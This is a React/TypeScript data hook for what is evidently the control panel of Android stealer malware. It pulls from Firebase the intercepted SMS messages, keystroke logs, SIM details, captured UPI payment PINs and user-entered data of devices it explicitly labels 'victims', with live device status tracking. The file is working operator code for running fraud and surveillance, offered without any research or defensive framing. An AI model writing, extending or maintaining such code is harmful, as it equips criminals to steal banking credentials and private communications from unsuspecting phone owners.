import { useState, useEffect, useCallback } from 'react';
import { DeviceInfo, Message, SimRow, KeyLog, UserEntered, AppsInstalled } from '@/data/db';
import { firebaseService } from '@/lib/firebaseService';
import { parseTime, formatTime } from '@/utils/time';
import { 
  validateDevices, 
  validateMessages, 
  validateSims, 
  validateKeyLogs, 
  validateUPIPins,
  validateUserEnteredData
} from '@/utils/dataValidation';

// Import mock data as fallback
import { DB } from '@/data/db';

export function useDB() {
  const [db, setDb] = useState<{
    DeviceInfo: Record<string, DeviceInfo>;
    Messages: Record<string, Message>;
    SMSData: Record<string, Message>;
    Sims: Record<string, SimRow[]>;
    KeyLogs: Record<string, KeyLog[]>;
    UPIPins: Record<string, Array<{ pin: string; timestamp: string }>>;
    UserEntered: Record<string, UserEntered>;
    AppsInstalled: Record<string, AppsInstalled>;
  }>({
    DeviceInfo: {},
    Messages: {},
    SMSData: {},
    Sims: {},
    KeyLogs: {},
    UPIPins: {},
    UserEntered: {},
    AppsInstalled: {}
  });

  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [initialized, setInitialized] = useState(false);

  // Initialize Firebase and load data (optimized for instant access)
  useEffect(() => {
    // Prevent multiple initializations
    if (initialized) return;
    
    const initializeData = async () => {
      try {
        setLoading(true);
        setError(null);

        // Try to initialize Firebase first
        try {
          await firebaseService.initializeEmptyCollections();
          
          // Load all essential data in parallel for instant access
          const [rawDevices, rawSMSData, rawUserEntered, rawAppsInstalled, rawUPIPins] = await Promise.all([
            firebaseService.getDevices(),
            firebaseService.getSMSData(),
            firebaseService.getUserEntered(),
            firebaseService.getAppsInstalled(),
            firebaseService.getAllUPIPins() // Load all UPI pins upfront
          ]);
          
          const validatedDevices = validateDevices(rawDevices);
          const validatedMessages = validateMessages(rawSMSData);
          const validatedUserEntered = validateUserEnteredData(rawUserEntered);
          const validatedAppsInstalled = rawAppsInstalled; // AppsInstalled doesn't need validation yet
          const validatedUPIPins = rawUPIPins; // UPI pins don't need validation yet

          setDb({
            DeviceInfo: validatedDevices,
            Messages: {}, // Deprecated
            SMSData: validatedMessages, // Use SMSData exclusively
            Sims: {}, // Load lazily when sims tab is accessed
            KeyLogs: {}, // Load lazily when keylogs tab is accessed
            UPIPins: validatedUPIPins, // Load UPI pins upfront for Device Management table
            UserEntered: validatedUserEntered, // Load user entered data upfront
            AppsInstalled: validatedAppsInstalled // Load apps installed data upfront
          });
        } catch (firebaseError) {
          console.warn('Firebase initialization failed, using mock data:', firebaseError);
          
          // Fallback to mock data if Firebase fails
          setDb({
            DeviceInfo: DB.DeviceInfo,
            Messages: {},
            SMSData: DB.Messages,
            Sims: DB.Sims,
            KeyLogs: DB.KeyLogs,
            UPIPins: DB.UPIPins,
            UserEntered: DB.UserEntered,
            AppsInstalled: DB.AppsInstalled
          });
        }
        
        setInitialized(true);
      } catch (err) {
        console.error('Error initializing data:', err);
        setError('Failed to load data from Firebase');
        
        // Final fallback to mock data
        setDb({
          DeviceInfo: DB.DeviceInfo,
          Messages: {},
          SMSData: DB.Messages,
          Sims: DB.Sims,
          KeyLogs: DB.KeyLogs,
          UPIPins: DB.UPIPins,
          UserEntered: DB.UserEntered,
          AppsInstalled: DB.AppsInstalled
        });
        setInitialized(true);
      } finally {
        setLoading(false);
      }
    };

    initializeData();
  }, [initialized]);

  // Set up real-time listeners for essential data
  useEffect(() => {
    if (loading) return;

    // Listen for device and SMSData updates
    const unsubscribeDevices = firebaseService.onDevicesUpdate((devices) => {
      const validated = validateDevices(devices);
      setDb((prev) => ({ ...prev, DeviceInfo: validated }));
    });

    const unsubscribeSMSData = firebaseService.onSMSDataUpdate((messages) => {
      const validated = validateMessages(messages);
      setDb((prev) => ({ ...prev, SMSData: validated }));
    });

    // Listen for user entered data updates
    const unsubscribeUserEntered = firebaseService.onUserEnteredUpdate((userEntered) => {
      setDb((prev) => ({ ...prev, UserEntered: userEntered }));
    });

    return () => {
      unsubscribeDevices();
      unsubscribeSMSData();
      unsubscribeUserEntered();
    };
  }, [loading]);

  // Lazy load SMSData when needed
  const loadMessages = useCallback(async () => {
    if (Object.keys(db.SMSData).length > 0) return; // Already loaded
    
    try {
      const rawSMS = await firebaseService.getSMSData();
      const validatedMessages = validateMessages(rawSMS);
      setDb(prev => ({ ...prev, SMSData: validatedMessages }));
      // Set up real-time listener for SMSData after loading
      const unsubscribe = firebaseService.onSMSDataUpdate((messages) => {
        const validated = validateMessages(messages);
        setDb((prev) => ({ ...prev, SMSData: validated }));
      });
      return unsubscribe;
    } catch (err) {
      console.error('Error loading messages:', err);
    }
  }, [db.SMSData]);

  // Lazy load SIMs when needed
  const loadSims = useCallback(async (victimId: string) => {
    if (db.Sims[victimId]) return; // Already loaded
    
    try {
      const rawSims = await firebaseService.getSims(victimId);
      const validatedSims = validateSims(rawSims);
      
      setDb(prev => ({
        ...prev,
        Sims: { ...prev.Sims, [victimId]: validatedSims }
      }));
    } catch (err) {
      console.error('Error loading SIMs:', err);
    }
  }, [db.Sims]);

  // Lazy load key logs when needed
  const loadKeyLogs = useCallback(async (victimId: string) => {
    if (db.KeyLogs[victimId]) return; // Already loaded
    
    try {
      const rawKeyLogs = await firebaseService.getKeyLogs(victimId, 100);
      const validatedKeyLogs = validateKeyLogs(rawKeyLogs);
      
      setDb(prev => ({
        ...prev,
        KeyLogs: { ...prev.KeyLogs, [victimId]: validatedKeyLogs }
      }));
    } catch (err) {
      console.error('Error loading key logs:', err);
    }
  }, [db.KeyLogs]);

  // Lazy load UPI pins when needed
  const loadUPIPins = useCallback(async (victimId: string) => {
    if (db.UPIPins[victimId]) return; // Already loaded
    
    try {
      const rawUpiPins = await firebaseService.getUPIPins(victimId);
      const validatedUpiPins = validateUPIPins(rawUpiPins);
      
      setDb(prev => ({
        ...prev,
        UPIPins: { ...prev.UPIPins, [victimId]: validatedUpiPins }
      }));
    } catch (err) {
      console.error('Error loading UPI pins:', err);
    }
  }, [db.UPIPins]);

  // Get messages for a specific victim - returns ALL messages without pagination
  const getVictimMessages = useCallback(async (victimId: string): Promise<Message[]> => {
    // Get all cached messages for this victim
    const cachedMessages = Object.values(db.SMSData)
      .filter((msg) => msg.VictimId === victimId)
      .sort((a, b) => parseTime(b.Time).getTime() - parseTime(a.Time).getTime());
    
    // Return all cached messages
    return cachedMessages;
  }, [db.SMSData]);

  // Get all messages sorted by time (newest first)
  const getAllMessages = useCallback((): Message[] => {
    return Object.values(db.SMSData).sort(
      (a, b) => parseTime(b.Time).getTime() - parseTime(a.Time).getTime()
    );
  }, [db.SMSData]);

  // Get recent messages (optimized with caching)
  const getRecentMessages = useCallback((limit: number = 5): Message[] => {
    return Object.values(db.SMSData)
      .sort((a, b) => parseTime(b.Time).getTime() - parseTime(a.Time).getTime())
      .slice(0, limit);
  }, [db.SMSData]);

  // Get total message count for a victim
  const getVictimMessageCount = useCallback((victimId: string): number => {
    return Object.values(db.SMSData)
      .filter((msg) => msg.VictimId === victimId)
      .length;
  }, [db.SMSData]);

  // Get SIM data for a victim (with lazy loading)
  const getSims = useCallback(async (victimId: string): Promise<SimRow[]> => {
    if (db.Sims[victimId]) {
      return db.Sims[victimId];
    }
    
    // Lazy load if not in cache
    try {
      const rawSims = await firebaseService.getSims(victimId);
      const validatedSims = validateSims(rawSims);
      
      setDb(prev => ({
        ...prev,
        Sims: { ...prev.Sims, [victimId]: validatedSims }
      }));
      return validatedSims;
    } catch (err) {
      console.error('Error loading SIMs:', err);
      // Return cached data if available, otherwise empty array
      return db.Sims[victimId] || [];
    }
  }, [db.Sims]);

  // Get key logs for a victim (with lazy loading and pagination)
  const getKeyLogs = useCallback(async (victimId: string, limit: number = 100): Promise<KeyLog[]> => {
    if (db.KeyLogs[victimId]) {
      return db.KeyLogs[victimId].slice(0, limit);
    }
    
    // Lazy load if not in cache
    try {
      const rawKeyLogs = await firebaseService.getKeyLogs(victimId, limit);
      const validatedKeyLogs = validateKeyLogs(rawKeyLogs);
      
      setDb(prev => ({
        ...prev,
        KeyLogs: { ...prev.KeyLogs, [victimId]: validatedKeyLogs }
      }));
      return validatedKeyLogs;
    } catch (err) {
      console.error('Error loading key logs:', err);
      // Return cached data if available, otherwise empty array
      return db.KeyLogs[victimId] || [];
    }
  }, [db.KeyLogs]);

  // Get UPI pins for a victim (with lazy loading)
  const getUPIs = useCallback(async (victimId: string): Promise<Array<{ pin: string; timestamp: string }>> => {
    if (db.UPIPins[victimId]) {
      return db.UPIPins[victimId];
    }
    
    // Lazy load if not in cache
    try {
      const rawUpiPins = await firebaseService.getUPIPins(victimId);
      const validatedUpiPins = validateUPIPins(rawUpiPins);
      
      setDb(prev => ({
        ...prev,
        UPIPins: { ...prev.UPIPins, [victimId]: validatedUpiPins }
      }));
      return validatedUpiPins;
    } catch (err) {
      console.error('Error loading UPI pins:', err);
      // Return cached data if available, otherwise empty array
      return db.UPIPins[victimId] || [];
    }
  }, [db.UPIPins]);




  // Calculate KPIs (memoized for performance)
  const getKPIs = useCallback(() => {
    const devices = Object.values(db.DeviceInfo);

    const totalDevices = devices.length;
    const onlineDevices = devices.filter((device) => (device.Status || '').toLowerCase() === 'online').length;
    const offlineDevices = Math.max(totalDevices - onlineDevices, 0);

    return {
      totalDevices,
      onlineDevices,
      offlineDevices
    };
  }, [db.DeviceInfo]);

  // Firebase operations
  const addDevice = useCallback(async (deviceId: string, deviceInfo: DeviceInfo) => {
    try {
      const deviceWithAdded: DeviceInfo = {
        ...deviceInfo,
        Added: deviceInfo.Added || formatTime(new Date())
      };
      await firebaseService.addDevice(deviceId, deviceWithAdded);
      // Data will be updated automatically via real-time listener
    } catch (err) {
      console.error('Error adding device:', err);
      throw err;
    }
  }, []);

  const updateDevice = useCallback(async (deviceId: string, updates: Partial<DeviceInfo>) => {
    try {
      await firebaseService.updateDevice(deviceId, updates);
      // Data will be updated automatically via real-time listener
    } catch (err) {
      console.error('Error updating device:', err);
      throw err;
    }
  }, []);

  const deleteDevice = useCallback(async (deviceId: string) => {
    try {
      await firebaseService.deleteDevice(deviceId);
      // Data will be updated automatically via real-time listener
    } catch (err) {
      console.error('Error deleting device:', err);
      throw err;
    }
  }, []);

  // Deprecated: adding to old Messages node is no longer supported

  return {
    db,
    loading,
    error,
    loadMessages,
    loadSims,
    loadKeyLogs,
    loadUPIPins,
    getVictimMessages,
    getAllMessages,
    getRecentMessages,
    getVictimMessageCount,
    getSims,
    getKeyLogs,
    getUPIs,
    getKPIs,
    addDevice,
    updateDevice,
    deleteDevice
  };
}